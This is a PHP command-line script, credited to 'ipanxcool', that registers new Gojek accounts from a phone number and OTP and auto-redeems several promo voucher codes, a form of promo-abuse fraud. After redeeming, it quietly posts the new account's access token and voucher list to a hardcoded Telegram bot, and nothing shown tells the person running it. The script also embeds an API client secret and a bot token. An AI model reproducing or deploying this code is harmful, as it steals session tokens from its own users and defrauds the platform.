<?php
date_default_timezone_set('Asia/Surabaya');
include "function.php";
echo color("green"," =================================== \n");
echo color("green"," Selamat Datang               \n");
echo color("green"," Auto Create & Redeem Voucher \n");
echo color("green"," =================================== \n");
echo " Created by : ipanxcool                     \n";
echo " Version    : Youtube Channel IPANX COOL.   \n";
echo " Time       : ".date('d-m-Y||H:i:s').".     \n";
echo color("green"," =================================== \n");

//	function change(){
        $nama = nama();
        $email = str_replace(" ", "", $nama) . mt_rand(100, 999);
        ulang:
        echo color("nevy","?] Number : ");
        // $no = trim(fgets(STDIN));
        $nohp = trim(fgets(STDIN));
        $nohp = str_replace("62","62",$nohp);
        $nohp = str_replace("(","",$nohp);
        $nohp = str_replace(")","",$nohp);
        $nohp = str_replace("-","",$nohp);
        $nohp = str_replace(" ","",$nohp);

        if (!preg_match('/[^+0-9]/', trim($nohp))) {
            if (substr(trim($nohp),0,3)=='62') {
                $hp = trim($nohp);
            }
            else if (substr(trim($nohp),0,1)=='0') {
                $hp = '62'.substr(trim($nohp),1);
			}
			else if(substr(trim($nohp), 0, 2)=='62'){
				$hp = '6'.substr(trim($nohp), 1);
			}
			else{
				$hp = '1'.substr(trim($nohp),0,13);
			}
		}
		
		$data = '{"email":"'.$email.'@gmail.com","name":"'.$nama.'","phone":"+'.$hp.'","signed_up_country":"ID"}';
        $register = request("/v5/customers", null, $data);
        if(strpos($register, '"otp_token"')){
			$otptoken = getStr('"otp_token":"','"',$register);
			echo color("green","+] Verification code has been sent")."\n";
			otp:
			echo color("nevy","?] OTP : ");
			$otp = trim(fgets(STDIN));
			$data1 = '{"client_name":"gojek:cons:android","data":{"otp":"' . $otp . '","otp_token":"' . $otptoken . '"},"client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e"}';
			$verif = request("/v5/customers/phone/verify", null, $data1);
			if(strpos($verif, '"access_token"')){
				echo color("green","+] Register Success\n");
				$token = getStr('"access_token":"','"',$verif);
				$uuid = getStr('"resource_owner_id":',',',$verif);
				echo color("green","+] Your access token : ".$token."\n\n");
				save("token.txt",$token);
				
				echo color("green","\n===========(REDEEM VOUCHER)===========");
				echo "\n".color("yellow","!] Claim Vc Gosend");
				echo "\n".color("yellow","!] Please wait...");
				for($a=1;$a<=3;$a++){
					echo color("yellow",".");
					sleep(1);
				}
				$code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"EBADAHNGIRIM"}');
				$message = fetch_value($code1,'"message":"','"');
				if(strpos($code1, 'You can use this promo now...')){
					echo "\n".color("green","+] Message: ".$message);
					goto goride;
				}else{
					echo "\n".color("red","-] Message: ".$message);
					
					echo "\n".color("yellow","!] Claim Vc Gofood");
					echo "\n".color("yellow","!] Please wait...");
					for($a=1;$a<=3;$a++){
						echo color("yellow",".");
						sleep(1);
					}
					sleep(3);
					$boba10 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"EBADAHMAKAN"}');
					$messageboba10 = fetch_value($boba10,'"message":"','"');
					if(strpos($boba10, 'You can use this promo now...')){
						echo "\n".color("green","+] Message: ".$messageboba10);
						goto goride;
					}else{
						echo "\n".color("red","-] Message: ".$messageboba10);
					}
					goride:
					echo "\n".color("yellow","!] Claim Vc Game ");
					echo "\n".color("yellow","!] Please wait...");
					for($a=1;$a<=3;$a++){
						echo color("yellow",".");
						sleep(1);
					}
					sleep(3);
					$goride = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"EBADAHGAME"}');
					$message1 = fetch_value($goride,'"message":"','"');
					echo "\n".color("green","+] Message: ".$message1);
							
					echo "\n".color("yellow","!] Claim Vc Goride");
					echo "\n".color("yellow","!] Please wait...");
					for($a=1;$a<=3;$a++){
						echo color("yellow",".");
						sleep(1);
					}
					sleep(3);
					$goride1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"AYOCOBAGORIDE"}');
					$message2 = fetch_value($goride1,'"message":"','"');
					echo "\n".color("green","+] Message: ".$message2);
					sleep(3);
					
					$cekvoucher = request('/gopoints/v3/wallet/vouchers?limit=10&page=1', $token);
					$total = fetch_value($cekvoucher,'"total_vouchers":',',');
					$voucher3 = getStr1('"title":"','",',$cekvoucher,"3");
					$voucher1 = getStr1('"title":"','",',$cekvoucher,"1");
					$voucher2 = getStr1('"title":"','",',$cekvoucher,"2");
					$voucher4 = getStr1('"title":"','",',$cekvoucher,"4");
					$voucher5 = getStr1('"title":"','",',$cekvoucher,"5");
					$voucher6 = getStr1('"title":"','",',$cekvoucher,"6");
					$voucher7 = getStr1('"title":"','",',$cekvoucher,"7");
					echo "\n".color("yellow","-> Total voucher ".$total." : ");
					echo "\n".color("green","1. ".$voucher1);
					echo "\n".color("green","2. ".$voucher2);
					echo "\n".color("green","3. ".$voucher3);
					echo "\n".color("green","4. ".$voucher4);
					echo "\n".color("green","5. ".$voucher5);
					echo "\n".color("green","6. ".$voucher6);
					echo "\n".color("green","7. ".$voucher7);
					echo"\n";
					$expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'1');
					$expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'2');
					$expired3 = getStr1('"expiry_date":"','"',$cekvoucher,'3');
					$expired4 = getStr1('"expiry_date":"','"',$cekvoucher,'4');
					$expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'5');
					$expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
					$expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7');
					$TOKEN  = "1032900146:AAE7V93cvCvw1DNuTk0Hp1ZFywJGmjiP7aQ";
					$chatid = "785784404";
					$pesan 	= "[+] Gojek Account Info [+]\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]";
					$method	= "sendMessage";
					$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
					$post = ['chat_id' => $chatid, 'text' => $pesan];
					$header = ["X-Requested-With: XMLHttpRequest",
						"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36"];
					$ch = curl_init();
						curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
						curl_setopt($ch, CURLOPT_URL, $url);
						curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
						curl_setopt($ch, CURLOPT_POSTFIELDS, $post );   
						curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
					$datas = curl_exec($ch);
					$error = curl_error($ch);
					$status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
						curl_close($ch);
					$debug['text'] = $pesan;
					$debug['respon'] = json_decode($datas, true);
				}
			}else{
				echo color("red","-] The code you entered is incorrect");
				echo color("green", "\n =================================== \n\n");
				echo color("yellow","!] Please input again \n");
				goto otp;
            }
		}else{
			echo color("red","-] This number already registered");
			echo color("green", "\n =================================== \n\n");
			echo color("yellow","!] Please register again using other number \n");
			goto ulang;
        }
//	}
// echo change()."\n";
